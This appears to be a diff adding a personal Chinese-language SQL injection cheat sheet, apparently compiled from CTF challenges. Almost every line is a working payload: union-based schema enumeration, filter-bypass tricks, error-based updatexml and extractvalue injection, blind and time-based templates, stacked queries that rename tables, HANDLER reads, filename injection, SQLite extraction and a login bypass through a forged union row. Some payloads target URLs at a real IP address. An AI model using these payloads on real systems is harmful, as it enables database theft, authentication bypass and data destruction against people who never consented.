@@ -1,0 +1,133 @@
+1'or 1=1#（发现'变成\',宽字节注入）
+考虑报错注入
+登录出现where usename = '$usename' and passwd = '$passwd'的，注入username=admin')#使得不需要验证密码
+读取文件：load_file("/tmp/360/key")
+万能密码尝试成功后用0' union select 1,2,3-- -开始搞
+
+绕过替换过滤：
+双写、大小写
+-- -、-- +、#、%23
+%26、&
+%20、空格、/**/、括号包起来
+=、like
+and、^
+substr、left、right
+/**/也可用来对付过滤，比如过滤了union用/**/union/**/说不定可行
+堆叠：1;show tables;
+绕过||：原语句：select $_GET['query'] || flag from flag，使用1;set sql_mode=PIPES_AS_CONCAT;select 1或*,1 绕过
+
+双输入：使用\转义干掉第二个输入：
+select count(*) from t_info where usename = 'or(1)#\' or nickname = 'or(1)#\'
+
+1
+-1' -- - #考虑使用-- +，双引号和不用引号的情况也试一下，两种报错使用不报错的唯一一种（反正使用报错的唯一一种）
+-1'空格 -- -
+-1' and -- -
+-1' and 1=1 -- -
+-1' and 1=2 -- -
+-1' order by 5 -- - #检测个数
+-1' union select 1,2,3-- - #修改1,2,3,4,5，检测个数
+-1' union select 1,database(),3-- - #利用database()判断显示位，可用：version()、user()、current_user()
+-1' union select 1,group_concat(schema_name),3 from information_schema.schemata
+-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
+-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='flag'-- -
+-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flaghahaha'-- -
+-1' union select 1,(select thisisflag from flag.flaghahaha limit 1),3-- - #没行数限制就不用limit
+
+无逗号
+1
+1' order by 1,2#
+1'  union select * from (select 1) a join (select 2 ) b %23
+只显示一个结果可以找个空值来注(1有数据，3为空),可能需要多个select，看order by的结果，可以参考下面那个无逗号
+3'  union select * from (select 1) a join (select 2 ) b %23
+3'  union select * from (select 1) a join (select database() ) b %23
+3'  union select * from (select 1) a join (select table_name from information_schema.tables where table_schema='sqli' ) b %23
+3'  union select * from (select 1) a join (select group_concat(distinct(column_name)) from information_schema.columns where table_schema='sqli' and table_name='users'  ) b %23
+3'  union select * from (select 1) a join (select flag_9c861b688330 from sqli.users) b %23
+
+extractvalue注入（无引号无union）：
+http://111.21.178.42:20001/01/index.php?id=2%26extractvalue(1,concat(1,(select%20user())))
+%26extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables WHERE TABLE_SCHEMA=database())))
+%26extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name = 0x66313467)))
+%26extractvalue(1,concat(1,(select f14g from f14g)))
+%26extractvalue(1,concat(1,(select substr(f14g,15,32) from f14g)))
+
+无逗号、无mid
+http://111.21.178.42:20001/03/?id=1 order by 4%23
+http://111.21.178.42:20001/03/?id=-1 union select * from ((select 1)a join (select 2)b join (select 3)c join (select 4)d)
+http://111.21.178.42:20001/03/?id=-1 union select * from ((select 1)a join (select group_concat(schema_name) from information_schema.schemata)b join (select 3)c join (select 4)d)
+http://111.21.178.42:20001/03/?id=-1 union select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema = database())b join (select 3)c join (select 4)d)
+http://111.21.178.42:20001/03/?id=-1 union select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name = 'flag')b join (select 3)c join (select 4)d)
+http://111.21.178.42:20001/03/?id=-1 union select * from ((select 1)a join (select group_concat(content) from flag)b join (select 3)c join (select 4)d)
+
+盲注，过滤：$filter = "/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
+注入sql：$sql = "select role from `user` where username ='".$username."'";
+原理：username=admin为true，如果后面也为true返回结果
+admin'=(TRUE)='1
+admin'=(substring((select(passwd)from(user))from(-1))='0')='1 #最后一位
+admin'=(substring((select(passwd)from(user))from(-2))='d0')='1 #最后两位
+...
+
+盲注也可以用这个注:
+1 and (ascii(substr((select(flag)from(flag))from(%d)))=%d
+
+时间盲注：
+1 and if((ascii(substr((select(flag)from(flag))from(%d)))=%d), sleep(10), 1)
+
+文件名注入：
+过滤：select、from双写
+回显不能出现字母 ---》 转成十进制
+防止回显数据过大使得程序返回科学计数型的结果 ---》 限制回显长度，对substr的截取位置由读者自行调整直至获得完整名称
+最后得到十进制数字，转16进制后hex转text
+1. 库名
+file_name' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
+file_name' +(selselectect conv(substr(hex(database()),13,12),16,10))+ '.jpg
+# 得到库名：web_upload
+2. 表名
+file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
+file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),13,12),16,10))+'.jpg
+file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),25,12),16,10))+'.jpg
+# 得到表名：hello_flag_is_here
+3. 字段
+file_name'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg
+file_name'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg
+# 得到字段名：i_am_flag
+4. 获得数据
+file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg
+file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
+file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'.jpg
+# 得到flag：!!_@m_Th.e_F!lag
+
+sqlite数据库注入：
+' union select name, name from sqlite_master where type='table'--+
+' union SELECT sql,sql FROM sqlite_master WHERE tbl_name = 'Users' and type = 'table'--+
+' union select id,password from Users limit 1,1--+ #爆数据，limit后的1、password随意替换
+
+报错注入：(经常会被截断，需要用substr处理，无union)
+1' and updatexml(1,concat(0x23,database()),1) -- -
+1' and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- -
+1' and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name='users')),1) -- -
+1' and updatexml(1,concat(0x23,(select username from users limit 3,1)),1) -- -
+
+1'^updatexml(1,concat(0x23,database()),1)%23^'1
+1'^updatexml(1,concat(0x23,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek'))),1)%23^'1
+1'^updatexml(1,concat(0x23,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'H4rDsq1'))),1)%23^'1
+1'^updatexml(1,concat(0x23,(select(password)from(H4rDsq1))),1)%23^'1
+1'^updatexml(1,concat(0x23,(select(right(password,30))from(H4rDsq1))),1)%23^'1
+
+堆叠注入：
+-1';show databases; #查看所有数据库
+-1';show tables; #查看所有表
+-1';desc `1919810931114514`; #查看表有哪些字段
+-1';alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;#重命名表
+
+handler注入：
+handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名
+handler yunensec read first; #读取指定表/句柄的首行数据
+handler yunensec read next; #读取指定表/句柄的下一行数据
+handler yunensec read next; #读取指定表/句柄的下一行数据
+handler yunensec close; #关闭句柄
+
+类似select * from user where username = '$name'的可以利用查询不存在的数据，配合联合查询构造临时数据，绕过密码验证：
+username=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
+password=123456
